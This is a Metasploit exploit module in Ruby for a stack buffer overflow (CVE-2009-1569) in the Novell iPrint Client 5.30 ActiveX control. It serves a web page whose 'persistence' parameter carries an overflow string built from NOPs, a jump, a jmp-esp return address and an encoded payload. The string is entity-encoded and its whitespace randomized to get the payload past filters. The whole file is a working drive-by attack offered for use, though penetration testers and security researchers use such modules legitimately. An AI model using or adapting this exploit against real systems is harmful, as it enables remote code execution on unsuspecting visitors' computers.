##
# $Id: novelliprint_datetime.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell iPrint Client ActiveX Control Date/Time Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in Novell iPrint Client 5.30. When
				passing a specially crafted date/time string via certain parameters to ienipp.ocx
				an attacker can execute arbitrary code.

				NOTE: The "operation" variable must be set to a valid command in order to reach this
				vulnerability.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'jduck' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2009-1569' ],
					[ 'BID', '37242' ],
					[ 'OSVDB', '60804' ],
					[ 'URL', 'http://secunia.com/advisories/35004/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 512,
					'BadChars'      => "\x00=:;,", # these are used in a strtok
					'PrependEncoder' => "\x81\xc4\xf0\xef\xff\xff",
					'DisableNops'   => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'iPrint 5.30 Windows Client', { 'Ret' => 0x1005ad5b } ] # jmp esp in ienipp.ocx v5.30
				],
			'DisclosureDate' => 'Dec 08 2009',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		sploit = "volatile-date-time"
		sploit << make_nops(60)
		# this should end up "\xeb\x04"
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+6").encode_string
		sploit << [target.ret].pack('V')
		sploit << p.encoded

		operations = [
			"op-client-interface-version",
			"op-client-version-info",
			"op-client-is-printer-installed",
			"op-user-get-role",
			"op-printer-install",
			"op-printer-remove",
			"op-printer-get-status",
			"op-printer-get-info",
			"op-printer-pause",
			"op-printer-resume",
			"op-printer-purge-jobs",
			"op-printer-list-users-jobs",
			"op-printer-list-all-jobs",
			"op-printer-send-test-page",
			"op-printer-send-file",
			"op-printer-setup-install",
			"op-job-get-info",
			"op-job-hold",
			"op-job-release-hold",
			"op-job-cancel",
			"op-job-restart",
			"op-dbg-printer-get-all-attrs",
			"op-dbg-job-get-all-attrs"
		]
		operation = operations[rand(operations.length)]

		# escape single quotes
		sploit = xml_encode(sploit)

		content = %Q|<html>
<object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C'>
<param name='operation' value='#{operation}' />
<param name='persistence' value='#{sploit}' />
</object>
</html>
|

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

	def xml_encode(str)
		ret = ""
		str.unpack('C*').each { |ch|
			case ch
			when 0x41..0x5a, 0x61..0x7a, 0x30..0x39
				ret << ch.chr
			else
				ret << "&#x"
				ret << ch.chr.unpack('H*')[0]
				ret << ";"
			end
		}
		ret
	end

end
